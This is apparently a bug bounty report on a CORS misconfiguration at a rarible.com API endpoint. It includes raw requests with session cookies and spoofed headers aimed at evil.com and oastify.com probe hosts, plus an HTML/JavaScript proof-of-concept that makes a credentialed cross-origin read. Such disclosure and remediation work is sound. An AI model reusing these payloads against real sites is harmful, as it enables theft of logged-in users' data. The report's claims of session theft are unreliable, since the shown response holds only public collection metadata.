@@ -1,0 +1,372 @@
+﻿# CORS Misconfiguration on rarible.com leading to Private Information Disclosure.
+
+
+Summary:
+
+An cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information.
+
+
+This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page
+
+
+
+CORS misconfiguration is found on https://rarible.com/marketplace/api/v4/collections/0x64ad353bc90a04361c4810ae7b3701f3beb48d7e as "Access-Control-Allow-Origin" is dynamically fetched from client Origin header with "Credentials" set as true.
+
+
+################################################################################
+
+                                Normal Request
+################################################################################
+
+
+```
+GET //marketplace/api/v4/collections/0x64ad353bc90a04361c4810ae7b3701f3beb48d7e HTTP/2
+Host: rarible.com
+Cookie: _gcl_au=1.1.1177127456.1663003633; _scid=992ae488-5c9a-4da7-949b-4f6bb8490851; _rdt_uuid=1663003649620.238d92f1-104a-4d11-b9f2-0de55d86d8af; _sctr=1|1662921000000; _fbp=fb.1.1663003661140.1864776274; _ga=GA1.1.1913819860.1663003650; _hjSessionUser_2596294=eyJpZCI6Ijk4MzEyZGY0LTcxZjUtNTRjNS1iNGE1LWJiYTM1ZWZjMGU4ZiIsImNyZWF0ZWQiOjE2NjMwMDM2NjY3MjQsImV4aXN0aW5nIjp0cnVlfQ==; _uetvid=32117ea032c011ed8789adaf2d7b2e28; _ga_QPJ7KC6DS2=GS1.1.1663164601.3.1.1663164849.60.0.0; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2NjMwMDM3OTcsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vcmFyaWJsZS5jb20vZXhwbG9yZS9zZWFyY2gvaGxvL2NvbGxlY3Rpb25zIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjYzMTY0ODQ5LCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3JhcmlibGUuY29tLyJ9fQ==; amp_150c42=XaWAN7B4913vESPGvAG-O2.N2NkYTA5YjljMWU5YjU0ZjZiM2MyZWVkYzNhOGI3ZWM=..1gcu5bkou.1gcu5j77b.d.i.v
+Cache-Control: max-age=0
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+
+```
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+                               Normal Response
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+
+
+```
+HTTP/2 404 Not Found
+Date: Thu, 15 Sep 2022 17:18:06 GMT
+Content-Type: text/html;charset=UTF-8
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
+Referrer-Policy: no-referrer
+Cf-Cache-Status: DYNAMIC
+Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=wSz6yOA59wEGhYyEgivmpCMW57CWCK%2FaCE72lw%2BodaVixUlKfguZxz9gEXHcYgqmn2A2eJBM009IlyaempbChl8m28WxOezVzVtgiU8pxAyiTDI7SsLjmADnFIzc"}],"group":"cf-nel","max_age":604800}
+Nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
+X-Content-Type-Options: nosniff
+Server: cloudflare
+Cf-Ray: 74b3050a9ab4319a-BOM
+
+<html><body><h1>Whitelabel Error Page</h1><p>This application has no configured error view, so you are seeing this as a fallback.</p><div id='created'>Thu Sep 15 17:18:06 UTC 2022</div><div>[d3eb4a97-22] There was an unexpected error (type=Not Found, status=404).</div></body></html>
+
+```
+
+
+================================================================================
+                                                                                                                       
+                           I AM USING THIS TYPE HEADR 
+================================================================================
+
+
+X-Fingerprint: d2fcb97386b75d083fa5059f22f56a16
+
+Origin: http://evil.com
+
+Sec-Fetch-Site: same-origin
+
+Referer: http://w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com/ref
+
+X-Real-Ip: spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+Client-Ip: spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+X-Client-Ip: spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+X-Originating-Ip: spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+From: root@w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+Forwarded: for=spoofed.vkjh3yhu9tu9f7x7irtjgpi8hznqhl89x.oastify.com;by=spoofed.vkjh3yhu9tu9f7x7irtjgpi8hznqhl89x.oastify.com;host=spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+True-Client-Ip: spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com/wap.xml
+
+Contact: root@w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+X-Forwarded-For: w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+
+
+********************************************************************************
+********************************************************************************
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+   
+                                 MODIFIED REQUEST
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                                                                 
+
+Step 1:
+Request:
+
+```
+GET /marketplace/api/v4/collections/0x64ad353bc90a04361c4810ae7b3701f3beb48d7e HTTP/2
+
+Host: rarible.com
+
+Cookie: _gcl_au=1.1.1177127456.1663003633; _scid=992ae488-5c9a-4da7-949b-4f6bb8490851; _rdt_uuid=1663003649620.238d92f1-104a-4d11-b9f2-0de55d86d8af; _sctr=1|1662921000000; _fbp=fb.1.1663003661140.1864776274; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2596294=eyJpZCI6ImJkM2ZlNGJjLTIyNDMtNDcxOC05ZjdjLWQ5MTgxYTlmNTZkZSIsImNyZWF0ZWQiOjE2NjMwMTAwMzc5MTgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=1; __kla_id=eyIkcmVmZXJyZXIiOnsidHMiOjE2NjMwMDM3OTcsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vcmFyaWJsZS5jb20vZXhwbG9yZS9zZWFyY2gvaGxvL2NvbGxlY3Rpb25zIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNjYzMDEwMDYyLCJ2YWx1ZSI6IiIsImZpcnN0X3BhZ2UiOiJodHRwczovL3JhcmlibGUuY29tL2V4cGxvcmUvc2VhcmNoL3oxMWJ3OXhycThpZTRpeTByejZ0YXoycW9odTdpdy5vYXN0aWZ5LmNvbS9pdGVtcz9xdWVyeT16MTFidzl4cnE4aWU0aXkwcno2dGF6MnFvaHU3aXcub2FzdGlmeS5jb20mbXVsdGlwbGU9YWxsJnZlcmlmaWVkPWZhbHNlJnNvcnQ9aHR0cHMlM0ElMkYlMkZ6MTFidzl4cnE4aWU0aXkwcno2dGF6MnFvaHU3aXcub2FzdGlmeS5jb20ifX0=; _gid=GA1.2.758094005.1663004305; _ga=GA1.1.1913819860.1663003650; _hjSessionUser_2596294=eyJpZCI6Ijk4MzEyZGY0LTcxZjUtNTRjNS1iNGE1LWJiYTM1ZWZjMGU4ZiIsImNyZWF0ZWQiOjE2NjMwMDM2NjY3MjQsImV4aXN0aW5nIjp0cnVlfQ==; _ga_QPJ7KC6DS2=GS1.1.1663010016.2.1.1663010062.14.0.0; _uetsid=321164f032c011edb5e997ef062237f0; _uetvid=32117ea032c011ed8789adaf2d7b2e28; amp_150c42=XaWAN7B4913vESPGvAG-O2.ZDJmY2I5NzM4NmI3NWQwODNmYTUwNTlmMjJmNTZhMTY=..1gcphun2l.1gcphvg36.b.e.p; ajs_anonymous_id=36ba1865-dd1c-4eda-9e54-f7230fc37b44; _gat=1
+
+Sec-Ch-Ua: "-Not.A/Brand";v="8", "Chromium";v="102"
+
+X-Fingerprint: d2fcb97386b75d083fa5059f22f56a16
+
+Sec-Ch-Ua-Mobile: ?0
+
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@vwvhfytult69r797ur5jspu8tzzqtln9c.oastify.com
+
+Sec-Ch-Ua-Platform: "Linux"
+
+Accept: */*
+
+Sec-Fetch-Site: same-origin
+
+Origin: http://evil.com
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Dest: empty
+
+Referer: http://w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com/ref
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+
+Cache-Control: no-transform
+
+Cf-Connecting_ip: spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+X-Real-Ip: spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+Client-Ip: spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+X-Client-Ip: spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+X-Originating-Ip: spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+From: root@w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+Forwarded: for=spoofed.vkjh3yhu9tu9f7x7irtjgpi8hznqhl89x.oastify.com;by=spoofed.vkjh3yhu9tu9f7x7irtjgpi8hznqhl89x.oastify.com;host=spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+True-Client-Ip: spoofed.w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com/wap.xml
+
+Contact: root@w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+X-Forwarded-For: w96et4mtq8chas3sezqgo3nda4gy4n.oastify.com
+
+Content-Length: 2
+
+```
+
+################################################################################
+
+                         MODIFIED REQUEST : RESPONSE
+################################################################################
+
+
+```
+
+HTTP/2 200 OK
+
+Date: Tue, 13 Sep 2022 12:04:30 GMT
+
+Content-Type: application/json
+
+Vary: Origin
+
+Vary: Access-Control-Request-Method
+
+Vary: Access-Control-Request-Headers
+
+*Access-Control-Allow-Origin: evil.com*
+
+Access-Control-Expose-Headers: X-CONTINUATION, Set-Cookie
+
+*Access-Control-Allow-Credentials: true*
+
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+
+Pragma: no-cache
+
+Expires: 0
+
+Referrer-Policy: no-referrer
+
+Cf-Cache-Status: DYNAMIC
+
+Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=Y6ykAs12POloxgp7DoqY19xnA8PHvzIzDv0J0fA%2FOXCqX25v007beJKZspum7qRod4OtDpIy9fyYTv8u6IYKD4tUBZAhFRvo9s5tg1c1ULe4EU%2Fma0T%2Bumrwlxk7"}],"group":"cf-nel","max_age":604800}
+
+Nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
+
+Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
+
+X-Content-Type-Options: nosniff
+
+Server: cloudflare
+
+Cf-Ray: 74a0beeacfa1a3af-AMD
+
+```
+
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+                        I HAVE GOT YOUR BACK END SERVER DATA 
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ 
+
+```
+
+{"blockchain":"ETHEREUM","cover":"https://openseauserdata.com/files/8619090efa9e751cb94097a1f1a18f1b.gif","description":"These boxes contain the data needed to understand the past, present, and future of RENGA Factory. Each box is a portal to a random archetype from worlds unknown. \n\nUse this box to open the portal and bring forth your character. Warning: please approach with caution ⚠️","editors":[],"features":["APPROVE_FOR_ALL"],"id":"0x64ad353bc90a04361c4810ae7b3701f3beb48d7e","name":"Black Box","owner":"0x60d190772500faca6a32e2b88ff0cfe5d9d75142","pic":"https://openseauserdata.com/files/0235e3588158a6397a3a2663cada69b8.gif","shortUrl":"renga-black-box","links":{"WEB_SITE_URL":"https://www.renga.app","DISCORD":"renga","TWITTER":"RENGA_inc","INSTAGRAM":"renga.factory"},"standard":"ERC721","symbol":"BOX","tags":[{"name":"pfp","source":"ADMIN"}],"shared":false,"blacklisted":false,"itemsWithRarity":false,"badges":["VERIFIED"],"coverMedia":[{"url":"https://openseauserdata.com/files/8619090efa9e751cb94097a1f1a18f1b.gif","sizeType":"ORIGINAL","contentType":"IMAGE"},{"url":"https://assets.raribleuserdata.com/prod/v1/image/t_cover_preview/aHR0cHM6Ly9vcGVuc2VhdXNlcmRhdGEuY29tL2ZpbGVzLzg2MTkwOTBlZmE5ZTc1MWNiOTQwOTdhMWYxYTE4ZjFiLmdpZg==","dimension":{"width":1000,"height":200},"sizeType":"PREVIEW","contentType":"IMAGE","cropMode":"CROP"},{"url":"https://assets.raribleuserdata.com/prod/v1/image/t_cover_big/aHR0cHM6Ly9vcGVuc2VhdXNlcmRhdGEuY29tL2ZpbGVzLzg2MTkwOTBlZmE5ZTc1MWNiOTQwOTdhMWYxYTE4ZjFiLmdpZg==","dimension":{"width":2200,"height":400},"sizeType":"BIG","contentType":"IMAGE","cropMode":"CROP"},{"url":"https://assets.raribleuserdata.com/prod/v1/image/t_cover_placeholder/aHR0cHM6Ly9vcGVuc2VhdXNlcmRhdGEuY29tL2ZpbGVzLzg2MTkwOTBlZmE5ZTc1MWNiOTQwOTdhMWYxYTE4ZjFiLmdpZg==","dimension":{"width":55,"height":10},"sizeType":"PLACEHOLDER","contentType":"IMAGE","cropMode":"CROP"}],"imageMedia":[{"url":"https://openseauserdata.com/files/0235e3588158a6397a3a2663cada69b8.gif","sizeType":"ORIGINAL","contentType":"IMAGE"},{"url":"https://assets.raribleuserdata.com/prod/v1/image/t_avatar_preview/aHR0cHM6Ly9vcGVuc2VhdXNlcmRhdGEuY29tL2ZpbGVzLzAyMzVlMzU4ODE1OGE2Mzk3YTNhMjY2M2NhZGE2OWI4LmdpZg==","dimension":{"width":30,"height":30},"sizeType":"PREVIEW","contentType":"IMAGE","cropMode":"THUMB"},{"url":"https://assets.raribleuserdata.com/prod/v1/image/t_avatar_big/aHR0cHM6Ly9vcGVuc2VhdXNlcmRhdGEuY29tL2ZpbGVzLzAyMzVlMzU4ODE1OGE2Mzk3YTNhMjY2M2NhZGE2OWI4LmdpZg==","dimension":{"width":240,"height":240},"sizeType":"BIG","contentType":"IMAGE","cropMode":"THUMB"}],"size":3161,"onSaleSize":-47,"hasTraits":true}
+
+```
+
+HIGHLIGHT:
+
+(1) "id":"0x64ad353bc90a04361c4810ae7b3701f3beb48d7e"
+(2) "name":"Black Box"
+(3) "owner":"0x60d190772500faca6a32e2b88ff0cfe5d9d75142"
+(4) ALL DETIALS ARE ENCRYPTED IN BLOCK CHAIN 
+
+
+
+
+Step 2: Exploiting CORS misconfiguration.
+
+1) open https://example.com in browser then inspect the page and go to console. Run the following code in console and you would find it pops up user information or Open above code in any browser and you would find it pops up user information like the attachment.
+
+
+Code:
+
+```
+
+
+<!DOCTYPE html>
+<html>
+<body>
+<center>
+<h1><p style="color:red; aligin:center; font-size:40px;">CORS POC Exploit</p></h1>
+<table>
+<tr><td>Software Failure. Press left mouse button to continue.</td></tr>
+<tr><td>Extract KR4K3N #00000004.0000AAC0</td></tr>
+</table>
+ 
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = alert(this.responseText);
+    }
+  };
+  xhttp.open("GET", "https://rarible.com/marketplace/api/v4/collections/0x64ad353bc90a04361c4810ae7b3701f3beb48d7e", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+ 
+</body>
+</html>
+
+
+<style>
+
+ 
+@keyframes blink { 50% { border-color: #ff0000; }  }
+table{ 
+  border: 8px solid #000000 ;
+  position: fixed ;
+  top: 40% ;
+  right: 45% ;
+  width: 25em ;
+  height: 5em ;
+  margin: -2.5em -10em ;
+  text-align:center ;
+  font-family: monospace ;
+  font-size: 25px ;
+  font-weight: bold 
+  color: #ff0000 ;
+  background-color: #000000 ; 
+  animation: blink .5s step-end infinite alternate; 
+}
+
+body{
+  background-color: #000000 ;
+  text-align:center ;
+  font-family: arcade, monospace ;
+  font-size: 15px ;
+  font-weight: bold ;
+  color: #ff0000 ;
+
+}
+
+
+    </style>
+
+
+
+```
+
+Note: Take note from request I inject a header Origin: http://evil.com then from response it returns Access-Control-Allow-Origin: http://evil.com. Which mean there is CORS misconfig here (refer screenshot attached).
+
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+                                     
+                                 Remediation
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                                                                                
+
+Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.
+
+
+********************************************************************************
+
+                               References
+
+********************************************************************************
+
+https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
+
+https://ejj.io/misconfigured-cors/
+
+
+Reference Reports: 
+(1) https://hackerone.com/reports/430249
+(2) https://hackerone.com/reports/317391
+(3) https://hackerone.com/reports/426147 
+(4) https://hackerone.com/reports/470298
+
+================================================================================
+
+                                Impact
+
+================================================================================
+
+1) In this report I want to describe High level bug which can seriously compromise a information.If I am authorize on this site, I can steal user's sessions, some personal information or do some action.
+2) Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
+3) Also If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information.
+
+
+
